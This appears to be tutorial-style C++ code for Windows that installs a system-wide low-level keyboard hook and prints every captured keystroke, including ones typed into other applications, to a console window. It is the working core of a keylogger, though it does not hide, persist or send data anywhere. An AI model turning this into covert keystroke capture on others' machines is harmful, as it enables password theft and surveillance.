#include <iostream>
#include <windows.h>

// Global hook handle
HHOOK keyboardHook = NULL;

// The upgraded callback function
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = pKeyBoard->vkCode;
            DWORD scanCode = pKeyBoard->scanCode;

            // 1. Handle special non-printable keys manually
            if (vkCode == VK_RETURN) { std::cout << "\n[ENTER]\n"; }
            else if (vkCode == VK_SPACE) { std::cout << " "; }
            else if (vkCode == VK_BACK) { std::cout << "[BACKSPACE]"; }
            else if (vkCode == VK_TAB) { std::cout << "[TAB]"; }
            // Ignore printing raw modifier keys (we only care about their effect on other keys)
            else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
                     vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
                     vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
                     vkCode == VK_CAPITAL) {
                // Do nothing when these are pressed by themselves
            }
            else {
                // 2. The Advanced Translation Logic
                BYTE keyboardState[256];
                
                // Get the exact state of all keys at this millisecond
                GetKeyboardState(keyboardState);

                // A variable to hold the output character
                WORD translatedChar = 0;

                // Ask Windows to calculate the final character based on the state
                int result = ToAscii(vkCode, scanCode, keyboardState, &translatedChar, 0);

                // If result is 1, it successfully mapped to a single character
                if (result == 1) {
                    std::cout << (char)translatedChar;
                }
            }
        }
    }
    
    // Pass the message to the next hook
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
int main() {
    // Set the hook. 
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    if (keyboardHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    // The Message Loop (Notice this is INSIDE the main function)
    MSG msg;
    // GetMessage blocks the thread until a message is received.
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up when the program exits
    UnhookWindowsHookEx(keyboardHook);
    
    return 0;
} // <-- This is the ONLY closing brace that should be at the end of the file.
